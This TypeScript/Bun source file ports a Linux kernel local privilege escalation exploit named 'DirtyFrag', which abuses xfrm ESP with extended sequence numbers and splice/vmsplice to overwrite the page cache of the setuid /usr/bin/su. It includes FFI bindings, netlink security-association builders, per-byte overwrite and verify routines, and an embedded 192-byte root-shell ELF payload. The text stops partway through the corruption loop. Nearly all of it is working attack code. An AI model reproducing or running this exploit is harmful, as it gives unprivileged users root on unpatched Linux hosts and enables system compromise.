#!/usr/bin/env bun
/**
 * DirtyFrag — TypeScript / Bun FFI port of exp.c
 * ESP (xfrm/authencesn) + rxrpc/rxkad LPE: uid=1000 → root
 *
 * Part 1 of 6: imports, FFI declarations, constants, utility helpers.
 */

import { dlopen, FFIType, ptr, CString, toBuffer } from "bun:ffi";
import { performance } from "node:perf_hooks";
import process from "node:process";

// ── FFI ───────────────────────────────────────────────────────────────────────

export const { symbols: C } = dlopen("libc.so.6", {
  // ---- process / user ----
  getuid: { returns: FFIType.u32, args: [] },
  geteuid: { returns: FFIType.u32, args: [] },
  getgid: { returns: FFIType.u32, args: [] },
  getpid: { returns: FFIType.i32, args: [] },
  fork: { returns: FFIType.i32, args: [] },
  setsid: { returns: FFIType.i32, args: [] },
  setpgid: { returns: FFIType.i32, args: [FFIType.i32, FFIType.i32] },
  tcsetpgrp: { returns: FFIType.i32, args: [FFIType.i32, FFIType.i32] },
  waitpid: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.ptr, FFIType.i32],
  },
  _exit: { returns: FFIType.void, args: [FFIType.i32] },
  unshare: { returns: FFIType.i32, args: [FFIType.i32] },

  // ---- file descriptors ----
  // open() is variadic; declare 3-arg form (mode=0 for 2-arg calls)
  open: {
    returns: FFIType.i32,
    args: [FFIType.cstring, FFIType.i32, FFIType.i32],
  },
  close: { returns: FFIType.i32, args: [FFIType.i32] },
  read: { returns: FFIType.i64, args: [FFIType.i32, FFIType.ptr, FFIType.u64] },
  write: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.u64],
  },
  pread64: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.u64, FFIType.i64],
  },
  dup: { returns: FFIType.i32, args: [FFIType.i32] },
  dup2: { returns: FFIType.i32, args: [FFIType.i32, FFIType.i32] },
  fcntl: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.i32, FFIType.i32],
  },
  pipe: { returns: FFIType.i32, args: [FFIType.ptr] },
  fstat: { returns: FFIType.i32, args: [FFIType.i32, FFIType.ptr] },

  // ---- memory ----
  mmap: {
    returns: FFIType.ptr,
    args: [
      FFIType.ptr,
      FFIType.u64,
      FFIType.i32,
      FFIType.i32,
      FFIType.i32,
      FFIType.i64,
    ],
  },
  munmap: { returns: FFIType.i32, args: [FFIType.ptr, FFIType.u64] },

  // ---- network ----
  socket: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.i32, FFIType.i32],
  },
  bind: { returns: FFIType.i32, args: [FFIType.i32, FFIType.ptr, FFIType.u32] },
  connect: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.ptr, FFIType.u32],
  },
  accept: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.ptr, FFIType.ptr],
  },
  send: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.u64, FFIType.i32],
  },
  recv: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.u64, FFIType.i32],
  },
  sendto: {
    returns: FFIType.i64,
    args: [
      FFIType.i32,
      FFIType.ptr,
      FFIType.u64,
      FFIType.i32,
      FFIType.ptr,
      FFIType.u32,
    ],
  },
  recvfrom: {
    returns: FFIType.i64,
    args: [
      FFIType.i32,
      FFIType.ptr,
      FFIType.u64,
      FFIType.i32,
      FFIType.ptr,
      FFIType.ptr,
    ],
  },
  sendmsg: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.i32],
  },
  recvmsg: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.i32],
  },
  setsockopt: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.i32, FFIType.i32, FFIType.ptr, FFIType.u32],
  },
  poll: { returns: FFIType.i32, args: [FFIType.ptr, FFIType.u32, FFIType.i32] },
  ioctl: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.u64, FFIType.ptr],
  },

  // ---- splice / vmsplice ----
  splice: {
    returns: FFIType.i64,
    args: [
      FFIType.i32,
      FFIType.ptr,
      FFIType.i32,
      FFIType.ptr,
      FFIType.u64,
      FFIType.u32,
    ],
  },
  vmsplice: {
    returns: FFIType.i64,
    args: [FFIType.i32, FFIType.ptr, FFIType.u64, FFIType.u32],
  },

  // ---- PTY ----
  posix_openpt: { returns: FFIType.i32, args: [FFIType.i32] },
  grantpt: { returns: FFIType.i32, args: [FFIType.i32] },
  unlockpt: { returns: FFIType.i32, args: [FFIType.i32] },
  ptsname: { returns: FFIType.ptr, args: [FFIType.i32] },

  // ---- terminal ----
  tcgetattr: { returns: FFIType.i32, args: [FFIType.i32, FFIType.ptr] },
  tcsetattr: {
    returns: FFIType.i32,
    args: [FFIType.i32, FFIType.i32, FFIType.ptr],
  },
  cfmakeraw: { returns: FFIType.void, args: [FFIType.ptr] },

  // ---- time ----
  time: { returns: FFIType.i64, args: [FFIType.ptr] },
  clock_gettime: { returns: FFIType.i32, args: [FFIType.i32, FFIType.ptr] },
  usleep: { returns: FFIType.i32, args: [FFIType.u32] },

  // ---- signals ----
  signal: { returns: FFIType.ptr, args: [FFIType.i32, FFIType.ptr] },

  // ---- misc ----
  strerror: { returns: FFIType.cstring, args: [FFIType.i32] },
  getenv: { returns: FFIType.ptr, args: [FFIType.cstring] },
  strtoull: {
    returns: FFIType.u64,
    args: [FFIType.ptr, FFIType.ptr, FFIType.i32],
  },
  __errno_location: { returns: FFIType.ptr, args: [] },

  // ---- exec (max-arity single declarations, pass null for unused trailing args) ----
  // execlp(file, arg0, arg1, arg2, arg3, NULL) — covers 0..4 real args
  execlp: {
    returns: FFIType.i32,
    args: [
      FFIType.cstring,
      FFIType.cstring,
      FFIType.cstring,
      FFIType.cstring,
      FFIType.ptr,
    ],
  },
  // execl(path, arg0, arg1, arg2, NULL) — covers 0..3 real args
  execl: {
    returns: FFIType.i32,
    args: [FFIType.cstring, FFIType.cstring, FFIType.cstring, FFIType.ptr],
  },
});

// Two separate dlopens for syscall — same symbol, different arg layouts.
// Bun FFI requires the key name to match the actual exported symbol, so we
// destructure each `syscall` into an alias at import time.
const {
  symbols: { syscall: _sysAddKeyRaw },
} = dlopen("libc.so.6", {
  syscall: {
    returns: FFIType.i64,
    args: [
      FFIType.i64,
      FFIType.ptr,
      FFIType.ptr,
      FFIType.ptr,
      FFIType.u64,
      FFIType.i32,
    ],
  },
});
export function sysAddKey(
  nr: bigint,
  type: Buffer,
  desc: Buffer,
  payload: Buffer,
  plen: bigint,
  ringid: number,
): bigint {
  return _sysAddKeyRaw(
    nr,
    ptr(type),
    ptr(desc),
    ptr(payload),
    plen,
    ringid,
  ) as bigint;
}

const {
  symbols: { syscall: _sysKeyctlRaw },
} = dlopen("libc.so.6", {
  syscall: {
    returns: FFIType.i64,
    args: [FFIType.i64, FFIType.i32, FFIType.i64],
  },
});
export function sysKeyctlInval(nr: bigint, op: number, key: bigint): bigint {
  return _sysKeyctlRaw(nr, op, key) as bigint;
}

// ── errno / strerror ──────────────────────────────────────────────────────────

export function getErrno(): number {
  const p = C.__errno_location() as number;
  return toBuffer(p, 0, 4).readInt32LE(0);
}

export function errStr(e = getErrno()): string {
  return (C.strerror(e) as string) ?? "unknown";
}

// ── Network constants ─────────────────────────────────────────────────────────

export const AF_INET = 2,
  AF_NETLINK = 16,
  AF_RXRPC = 33,
  PF_RXRPC = 33,
  AF_ALG = 38;
export const SOCK_DGRAM = 2,
  SOCK_RAW = 3,
  SOCK_SEQPACKET = 5;
export const IPPROTO_ESP = 50;
export const SOL_SOCKET = 1,
  SOL_UDP = 17,
  SOL_ALG = 279,
  SOL_RXRPC = 272;
export const SO_REUSEADDR = 2;
export const UDP_ENCAP = 100,
  UDP_ENCAP_ESPINUDP = 2;
export const NETLINK_XFRM = 6;
export const NLM_F_REQUEST = 0x01,
  NLM_F_ACK = 0x04;
export const NLMSG_ERROR = 2;

// xfrm
export const XFRM_MSG_NEWSA = 0x10; // XFRM_MSG_BASE
export const XFRM_MODE_TRANSPORT = 0;
export const XFRM_STATE_ESN = 128;
export const XFRMA_ALG_CRYPT = 2;
export const XFRMA_ENCAP = 4;
export const XFRMA_ALG_AUTH_TRUNC = 20;
export const XFRMA_REPLAY_ESN_VAL = 23;

// rxrpc
export const RXRPC_PACKET_TYPE_DATA = 1;
export const RXRPC_PACKET_TYPE_CHALLENGE = 6;
export const RXRPC_LAST_PACKET = 0x04;
export const RXRPC_CHANNELMASK = 3;
export const RXRPC_CIDSHIFT = 2;
export const RXRPC_CLIENT_INITIATED = 0x01;
export const RXRPC_SECURITY_KEY = 1;
export const RXRPC_MIN_SECURITY_LEVEL = 2;
export const RXRPC_SECURITY_AUTH = 1;
export const RXRPC_USER_CALL_ID = 1;

// AF_ALG
export const ALG_SET_KEY = 1,
  ALG_SET_IV = 2,
  ALG_SET_OP = 3;
export const ALG_OP_DECRYPT = 0,
  ALG_OP_ENCRYPT = 1;

// ── Process / fd / ioctl constants ────────────────────────────────────────────

export const CLONE_NEWUSER = 0x10000000,
  CLONE_NEWNET = 0x40000000;
export const O_RDONLY = 0,
  O_WRONLY = 1,
  O_RDWR = 2;
export const O_NOCTTY = 0o400,
  O_NONBLOCK = 0o4000;
export const STDIN_FILENO = 0,
  STDOUT_FILENO = 1,
  STDERR_FILENO = 2;

export const SIOCGIFFLAGS = 0x8913n,
  SIOCSIFFLAGS = 0x8914n;
export const TIOCGWINSZ = 0x5413n,
  TIOCSWINSZ = 0x5414n,
  TIOCSCTTY = 0x540en;
export const IFF_UP = 1,
  IFF_RUNNING = 64;
export const IFNAMSIZ = 16;

export const F_GETFL = 3,
  F_SETFL = 4;
export const SPLICE_F_MOVE = 1,
  SPLICE_F_NONBLOCK = 2;
export const WNOHANG = 1;
export const TCSANOW = 0;
export const PROT_READ = 1,
  MAP_SHARED = 1;
export const CLOCK_MONOTONIC = 1;

export const SIGTTOU = 22,
  SIGTTIN = 21,
  SIGPIPE = 13,
  SIGHUP = 1;
export const SIG_IGN = 1n; // (void*)1

// syscall numbers (x86_64)
export const SYS_ADD_KEY = 248n,
  SYS_KEYCTL = 250n;
export const KEY_SPEC_PROCESS_KEYRING = -2;
export const KEYCTL_INVALIDATE = 3;

// ── Exploit parameters ────────────────────────────────────────────────────────

export const ENC_PORT = 4500;
export const SEQ_VAL = 200;
export const REPLAY_SEQ = 100;
export const TARGET_PATH = "/usr/bin/su";
export const PATCH_OFFSET = 0;
export const PAYLOAD_LEN = 192;
export const ENTRY_OFFSET = 0x78;

// 192-byte minimal x86_64 root-shell ELF (see exp.c header comment)
export const SHELL_ELF = new Uint8Array([
  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00,
  0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01,
  0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
  0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a, 0x0f, 0x05,
  0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74, 0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05,
  0x12, 0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00,
  0x00, 0x00, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d,
  0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
  0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
]);

// ── Byte-order helpers (host is little-endian x86_64) ─────────────────────────

export function htonl(x: number): number {
  return (
    (((x & 0xff) << 24) |
      (((x >>> 8) & 0xff) << 16) |
      (((x >>> 16) & 0xff) << 8) |
      ((x >>> 24) & 0xff)) >>>
    0
  );
}
export function htons(x: number): number {
  return (((x & 0xff) << 8) | ((x >>> 8) & 0xff)) & 0xffff;
}
export const ntohl = htonl;
export const ntohs = htons;

/** Parse dotted-decimal → 32-bit network-byte-order value (LE u32). */
export function inetAddr(s: string): number {
  const p = s.split(".").map(Number);
  return (p[0] | (p[1] << 8) | (p[2] << 16) | (p[3] << 24)) >>> 0;
}

// ── Buffer / DataView utilities ───────────────────────────────────────────────

/** Allocate a zeroed Buffer and return [Buffer, DataView] pair. */
export function alloc(size: number): [Buffer, DataView] {
  const buf = Buffer.alloc(size, 0);
  return [buf, new DataView(buf.buffer, buf.byteOffset, size)];
}

/** Copy a string (ASCII/UTF-8) into a buffer at offset, null-terminated. */
export function writeStr(buf: Buffer, offset: number, s: string): void {
  const bytes = Buffer.from(s, "ascii");
  bytes.copy(buf, offset, 0, Math.min(bytes.length, buf.length - offset - 1));
  buf[offset + Math.min(bytes.length, buf.length - offset - 1)] = 0;
}

/** Read a null-terminated C string from a native pointer. */
export function readCStr(p: number | bigint): string {
  return new CString(typeof p === "bigint" ? Number(p) : p).toString();
}

/** Read a u32 from a native pointer offset. */
export function readU32(p: number, off: number): number {
  return toBuffer(p + off, 0, 4).readUInt32LE(0);
}

/** Read an i64 from a native pointer offset (as number). */
export function readI64(p: number, off: number): bigint {
  return toBuffer(p + off, 0, 8).readBigInt64LE(0);
}

// ── Logging (mirrors LOG / WARN / DBG macros) ─────────────────────────────────

export function LOG(msg: string): void {
  process.stderr.write(`[+] ${msg}\n`);
}
export function WARN(msg: string): void {
  process.stderr.write(`[!] ${msg}\n`);
}
export function DBG(msg: string): void {
  process.stderr.write(`[.] ${msg}\n`);
}

export let g_su_verbose = 0;
export function SLOG(msg: string): void {
  if (g_su_verbose) process.stderr.write(`[su] ${msg}\n`);
}

// ── waitpid status macros ─────────────────────────────────────────────────────

export function WIFEXITED(s: number): boolean {
  return (s & 0x7f) === 0;
}
export function WEXITSTATUS(s: number): number {
  return (s >> 8) & 0xff;
}

// ── getenv helper ─────────────────────────────────────────────────────────────

// ── cstring encoding (Bun v1.3 requires Buffer, not raw string, for cstring args) ──

/** Encode a JS string as a null-terminated latin-1 Buffer for FFI cstring args. */
export function cstr(s: string): Buffer {
  return Buffer.from(s + "\0", "latin1");
}

// Save a direct alias to the raw FFI open before any wrapping.
const _openFFI = C.open;

/** open() wrapper — encodes string path to Buffer for the FFI cstring arg. */
export function openFd(path: string, flags: number, mode = 0): number {
  return _openFFI(cstr(path), flags, mode) as number;
}

// stdout progress helper — visible even when stderr is redirected to /dev/null
export function progress(msg: string): void {
  process.stdout.write(`[>>] ${msg}\n`);
}

export function getEnv(name: string): string | null {
  const p = C.getenv(cstr(name)) as number | null;
  if (!p) return null;
  return readCStr(p);
}

// ═══════════════════════════════════════════════════════════════════════════════
// PART 2 — Struct helpers + su_lpe path
// ═══════════════════════════════════════════════════════════════════════════════

// ── Struct size / offset constants (x86_64 Linux ABI) ────────────────────────

// sockaddr_in: family(2)+port(2,BE)+addr(4)+pad(8) = 16
const SIZEOF_SOCKADDR_IN = 16;
// sockaddr_nl: family(2)+pad(2)+pid(4)+groups(4) = 12
const SIZEOF_SOCKADDR_NL = 12;
// ifreq: name[16] + union(16) = 32  (flags at union offset 0 → byte 16)
const SIZEOF_IFREQ = 32;
// nlmsghdr: len(4)+type(2)+flags(2)+seq(4)+pid(4) = 16
const SIZEOF_NLMSGHDR = 16;
// rtattr: rta_len(2)+rta_type(2) = 4
const SIZEOF_RTATTR = 4;
// xfrm_usersa_info = 176
const SIZEOF_XSA_INFO = 176;
// xfrm_algo_auth header = name[64]+key_len(4)+trunc_len(4) = 72
const SIZEOF_ALGO_AUTH_HDR = 72;
// xfrm_algo header = name[64]+key_len(4) = 68
const SIZEOF_ALGO_HDR = 68;
// xfrm_encap_tmpl = type(2)+sport(2)+dport(2)+pad(2)+oa(16) = 24
const SIZEOF_ENCAP_TMPL = 24;
// xfrm_replay_state_esn header = 6×u32 = 24
const SIZEOF_ESN_HDR = 24;
// iovec = base(8)+len(8) = 16
const SIZEOF_IOVEC = 16;
// struct stat st_size is at offset 48
const STAT_OFF_SIZE = 48;

const NLMSG_HDRLEN = SIZEOF_NLMSGHDR; // already 4-aligned

function nlmsgAlign(n: number): number {
  return (n + 3) & ~3;
}
function rtaAlign(n: number): number {
  return (n + 3) & ~3;
}
function rtaLength(dataLen: number): number {
  return SIZEOF_RTATTR + dataLen;
}

// ── Struct builders ───────────────────────────────────────────────────────────

/** Build a zeroed sockaddr_in. port and addr are in host byte order. */
export function makeSockaddrIn(port: number, addrNet: number): Buffer {
  // addrNet is already in network byte order (from inetAddr())
  const sa = Buffer.alloc(SIZEOF_SOCKADDR_IN, 0);
  sa.writeUInt16LE(AF_INET, 0);
  sa.writeUInt16BE(port, 2); // sin_port: network byte order
  sa.writeUInt32LE(addrNet, 4); // sin_addr: already BE bytes as LE u32
  return sa;
}

/** Build a sockaddr_nl (all fields zero = bind to kernel). */
function makeSockaddrNl(): Buffer {
  const nl = Buffer.alloc(SIZEOF_SOCKADDR_NL, 0);
  nl.writeUInt16LE(AF_NETLINK, 0);
  return nl;
}

/** Build a struct iovec pointing at buf[0..len). */
function makeIovec(buf: Buffer, len?: number): Buffer {
  const iov = Buffer.alloc(SIZEOF_IOVEC, 0);
  const dv = new DataView(iov.buffer, iov.byteOffset);
  dv.setBigUint64(0, BigInt(ptr(buf)), true); // iov_base
  dv.setBigUint64(8, BigInt(len ?? buf.length), true); // iov_len
  return iov;
}

/**
 * Append an rtattr to the netlink message in nlhBuf.
 * nlhBuf must be large enough. nlhBuf[0..3] holds nlmsg_len (LE u32).
 */
function putAttr(nlhBuf: Buffer, attrType: number, data: Buffer): void {
  const curLen = nlhBuf.readUInt32LE(0);
  const aligned = nlmsgAlign(curLen); // NLMSG_ALIGN(nlmsg_len)
  const rtaLen = rtaLength(data.length); // RTA_LENGTH

  nlhBuf.writeUInt16LE(rtaLen, aligned); // rta_len
  nlhBuf.writeUInt16LE(attrType, aligned + 2); // rta_type
  data.copy(nlhBuf, aligned + SIZEOF_RTATTR); // RTA_DATA

  nlhBuf.writeUInt32LE(aligned + rtaAlign(rtaLen), 0); // updated nlmsg_len
}

// ── write_proc / write_file ───────────────────────────────────────────────────

function writeProc(path: string, content: string): number {
  const fd = openFd(path, O_WRONLY, 0) as number;
  if (fd < 0) return -1;
  const buf = Buffer.from(content, "ascii");
  const n = C.write(fd, ptr(buf), BigInt(buf.length)) as bigint;
  C.close(fd);
  return Number(n);
}

// ── setup_userns_netns ────────────────────────────────────────────────────────

function setupUsernsNetns(): void {
  const realUid = C.getuid() as number;
  const realGid = C.getgid() as number;
  progress(`setupUsernsNetns: uid=${realUid} gid=${realGid}`);

  if ((C.unshare(CLONE_NEWUSER | CLONE_NEWNET) as number) < 0) {
    SLOG(`unshare: ${errStr()}`);
    process.exit(1);
  }

  writeProc("/proc/self/setgroups", "deny");

  if (writeProc("/proc/self/uid_map", `0 ${realUid} 1`) < 0) {
    SLOG(`uid_map: ${errStr()}`);
    process.exit(1);
  }
  if (writeProc("/proc/self/gid_map", `0 ${realGid} 1`) < 0) {
    SLOG(`gid_map: ${errStr()}`);
    process.exit(1);
  }

  const s = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
  if (s < 0) {
    SLOG(`socket: ${errStr()}`);
    process.exit(1);
  }

  const ifr = Buffer.alloc(SIZEOF_IFREQ, 0);
  writeStr(ifr, 0, "lo"); // ifr_name = "lo"

  if ((C.ioctl(s, SIOCGIFFLAGS, ptr(ifr)) as number) < 0) {
    SLOG(`SIOCGIFFLAGS: ${errStr()}`);
    process.exit(1);
  }
  const flags = ifr.readInt16LE(IFNAMSIZ); // ifr_flags at offset 16
  ifr.writeInt16LE(flags | IFF_UP | IFF_RUNNING, IFNAMSIZ);
  if ((C.ioctl(s, SIOCSIFFLAGS, ptr(ifr)) as number) < 0) {
    SLOG(`SIOCSIFFLAGS: ${errStr()}`);
    process.exit(1);
  }
  C.close(s);
}

// ── add_xfrm_sa ───────────────────────────────────────────────────────────────

const LOCALHOST = inetAddr("127.0.0.1");
const U64_MAX = 0xffffffffffffffffn;

function addXfrmSa(spi: number, patchSeqhi: number): number {
  const sk = C.socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM) as number;
  if (sk < 0) return -1;

  const nlBind = makeSockaddrNl();
  if ((C.bind(sk, ptr(nlBind), SIZEOF_SOCKADDR_NL) as number) < 0) {
    C.close(sk);
    return -1;
  }

  // 4 KiB working buffer — nlmsghdr sits at offset 0
  const buf = Buffer.alloc(4096, 0);

  // ── nlmsghdr ──
  const hdrLen = NLMSG_HDRLEN + SIZEOF_XSA_INFO;
  buf.writeUInt32LE(hdrLen, 0); // nlmsg_len (will grow with attrs)
  buf.writeUInt16LE(XFRM_MSG_NEWSA, 4); // nlmsg_type
  buf.writeUInt16LE(NLM_F_REQUEST | NLM_F_ACK, 6); // nlmsg_flags
  buf.writeUInt32LE(1, 8); // nlmsg_seq
  buf.writeUInt32LE(C.getpid() as number, 12); // nlmsg_pid

  // ── xfrm_usersa_info (starts at offset 16) ──
  const xs = NLMSG_HDRLEN; // base offset of xfrm_usersa_info

  // sel.daddr.a4  (offset 0 within sel → xs+0)
  buf.writeUInt32LE(LOCALHOST, xs + 0);
  // sel.saddr.a4  (offset 16 within sel → xs+16)
  buf.writeUInt32LE(LOCALHOST, xs + 16);
  // sel.family    (offset 40 within sel → xs+40)
  buf.writeUInt16LE(AF_INET, xs + 40);
  // sel.prefixlen_d (xs+42), sel.prefixlen_s (xs+43)
  buf[xs + 42] = 32;
  buf[xs + 43] = 32;

  // id.daddr.a4   (sel=56 → xs+56)
  buf.writeUInt32LE(LOCALHOST, xs + 56);
  // id.spi        (xs+72): stored in network byte order
  buf.writeUInt32BE(spi, xs + 72);
  // id.proto      (xs+76)
  buf[xs + 76] = IPPROTO_ESP;

  // saddr.a4      (xs+80)
  buf.writeUInt32LE(LOCALHOST, xs + 80);

  // family        (xs+164)
  buf.writeUInt16LE(AF_INET, xs + 164);
  // mode          (xs+166): XFRM_MODE_TRANSPORT = 0
  // replay_window (xs+167): 0
  // reqid         (xs+160)
  buf.writeUInt32LE(0x1234, xs + 160);
  // flags         (xs+168): XFRM_STATE_ESN = 128
  buf[xs + 168] = XFRM_STATE_ESN;

  // lft limits: all UINT64_MAX  (xs+96..127)
  const xsDv = new DataView(buf.buffer, buf.byteOffset);
  xsDv.setBigUint64(xs + 96, U64_MAX, true);
  xsDv.setBigUint64(xs + 104, U64_MAX, true);
  xsDv.setBigUint64(xs + 112, U64_MAX, true);
  xsDv.setBigUint64(xs + 120, U64_MAX, true);

  // ── XFRMA_ALG_AUTH_TRUNC (hmac-sha256, 32-byte key 0xAA, trunc=128) ──
  {
    const ab = Buffer.alloc(SIZEOF_ALGO_AUTH_HDR + 32, 0);
    writeStr(ab, 0, "hmac(sha256)");
    ab.writeUInt32LE(32 * 8, 64); // alg_key_len  (bits)
    ab.writeUInt32LE(128, 68); // alg_trunc_len (bits)
    ab.fill(0xaa, 72, 72 + 32); // alg_key
    putAttr(buf, XFRMA_ALG_AUTH_TRUNC, ab);
  }

  // ── XFRMA_ALG_CRYPT (cbc-aes, 16-byte key 0xBB) ──
  {
    const eb = Buffer.alloc(SIZEOF_ALGO_HDR + 16, 0);
    writeStr(eb, 0, "cbc(aes)");
    eb.writeUInt32LE(16 * 8, 64); // alg_key_len (bits)
    eb.fill(0xbb, 68, 68 + 16); // alg_key
    putAttr(buf, XFRMA_ALG_CRYPT, eb);
  }

  // ── XFRMA_ENCAP ──
  {
    const enc = Buffer.alloc(SIZEOF_ENCAP_TMPL, 0);
    enc.writeUInt16LE(UDP_ENCAP_ESPINUDP, 0); // encap_type
    enc.writeUInt16BE(ENC_PORT, 2); // encap_sport (BE)
    enc.writeUInt16BE(ENC_PORT, 4); // encap_dport (BE)
    // encap_oa = 0
    putAttr(buf, XFRMA_ENCAP, enc);
  }

  // ── XFRMA_REPLAY_ESN_VAL ──
  {
    const esn = Buffer.alloc(SIZEOF_ESN_HDR + 4, 0); // bmp_len=1 → 1 u32
    esn.writeUInt32LE(1, 0); // bmp_len
    esn.writeUInt32LE(0, 4); // oseq
    esn.writeUInt32LE(REPLAY_SEQ, 8); // seq
    esn.writeUInt32LE(0, 12); // oseq_hi
    esn.writeUInt32LE(patchSeqhi, 16); // seq_hi  ← exploit payload
    esn.writeUInt32LE(32, 20); // replay_window
    putAttr(buf, XFRMA_REPLAY_ESN_VAL, esn);
  }

  // send
  const msgLen = buf.readUInt32LE(0);
  if ((C.send(sk, ptr(buf), BigInt(msgLen), 0) as bigint) < 0n) {
    C.close(sk);
    return -1;
  }

  // receive ACK
  const rbuf = Buffer.alloc(4096, 0);
  const n = C.recv(sk, ptr(rbuf), BigInt(rbuf.length), 0) as bigint;
  C.close(sk);
  if (n < 0n) return -1;

  const rType = rbuf.readUInt16LE(4);
  if (rType === NLMSG_ERROR) {
    const errCode = rbuf.readInt32LE(NLMSG_HDRLEN); // nlmsgerr.error
    if (errCode !== 0) return -1;
  }
  return 0;
}

// ── do_one_write ──────────────────────────────────────────────────────────────

function doOneWrite(path: string, offset: number, spi: number): number {
  // receiver socket (UDP, ESP-in-UDP decap)
  const skRecv = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
  if (skRecv < 0) return -1;

  const one = Buffer.alloc(4);
  one.writeInt32LE(1, 0);
  C.setsockopt(skRecv, SOL_SOCKET, SO_REUSEADDR, ptr(one), 4);

  const saD = makeSockaddrIn(ENC_PORT, LOCALHOST);
  if ((C.bind(skRecv, ptr(saD), SIZEOF_SOCKADDR_IN) as number) < 0) {
    C.close(skRecv);
    return -1;
  }

  const encap = Buffer.alloc(4);
  encap.writeInt32LE(UDP_ENCAP_ESPINUDP, 0);
  if ((C.setsockopt(skRecv, SOL_UDP, UDP_ENCAP, ptr(encap), 4) as number) < 0) {
    C.close(skRecv);
    return -1;
  }

  // sender socket
  const skSend = C.socket(AF_INET, SOCK_DGRAM, 0) as number;
  if (skSend < 0) {
    C.close(skRecv);
    return -1;
  }

  if ((C.connect(skSend, ptr(saD), SIZEOF_SOCKADDR_IN) as number) < 0) {
    C.close(skSend);
    C.close(skRecv);
    return -1;
  }

  // open target file
  const fileFd = openFd(path, O_RDONLY, 0) as number;
  if (fileFd < 0) {
    C.close(skSend);
    C.close(skRecv);
    return -1;
  }

  // pipe
  const pipeFds = Buffer.alloc(8, 0);
  if ((C.pipe(ptr(pipeFds)) as number) < 0) {
    C.close(fileFd);
    C.close(skSend);
    C.close(skRecv);
    return -1;
  }
  const pfd0 = pipeFds.readInt32LE(0);
  const pfd1 = pipeFds.readInt32LE(4);

  // Build ESP header: SPI(4) + SEQ(4) + 16 bytes payload marker (0xCC)
  const hdr = Buffer.alloc(24, 0);
  hdr.writeUInt32BE(spi, 0); // SPI in network byte order
  hdr.writeUInt32BE(SEQ_VAL, 4); // sequence in network byte order
  hdr.fill(0xcc, 8, 24); // 16-byte "body"

  // vmsplice header into pipe
  const iovH = makeIovec(hdr, 24);
  const vs = C.vmsplice(pfd1, ptr(iovH), 1n, 0) as bigint;
  if (vs !== 24n) {
    C.close(fileFd);
    C.close(pfd0);
    C.close(pfd1);
    C.close(skSend);
    C.close(skRecv);
    return -1;
  }

  // splice 16 bytes from file at `offset` into pipe
  const offBuf = Buffer.alloc(8);
  offBuf.writeBigInt64LE(BigInt(offset));
  const spl1 = C.splice(
    fileFd,
    ptr(offBuf),
    pfd1,
    0,
    16n,
    SPLICE_F_MOVE,
  ) as bigint;
  if (spl1 !== 16n) {
    C.close(fileFd);
    C.close(pfd0);
    C.close(pfd1);
    C.close(skSend);
    C.close(skRecv);
    return -1;
  }

  // splice pipe → skSend (24 hdr + 16 body = 40 bytes)
  const spl2 = C.splice(pfd0, 0, skSend, 0, 40n, SPLICE_F_MOVE) as bigint;
  // continue regardless (kernel may have already processed the page)

  C.usleep(150 * 1000);
  C.close(fileFd);
  C.close(pfd0);
  C.close(pfd1);
  C.close(skSend);
  C.close(skRecv);
  return spl2 === 40n ? 0 : -1;
}

// ── verify_byte ───────────────────────────────────────────────────────────────

function verifyByte(path: string, offset: number, want: number): number {
  const fd = openFd(path, O_RDONLY, 0) as number;
  if (fd < 0) return -1;
  const got = Buffer.alloc(1);
  const n = C.pread64(fd, ptr(got), 1n, BigInt(offset)) as bigint;
  C.close(fd);
  if (n !== 1n) return -1;
  return got[0] === want ? 0 : -1;
}

// ── corrupt_su ────────────────────────────────────────────────────────────────

function corruptSu(): number {
  progress("corruptSu: unshare user+net namespace...");
  setupUsernsNetns();
  C.usleep(100 * 1000);

  const count = PAYLOAD_LEN / 4; // 48 SAs
  progress(`corruptSu: installing ${count} xfrm SAs...`);

  for (let i = 0; i < count; i++) {
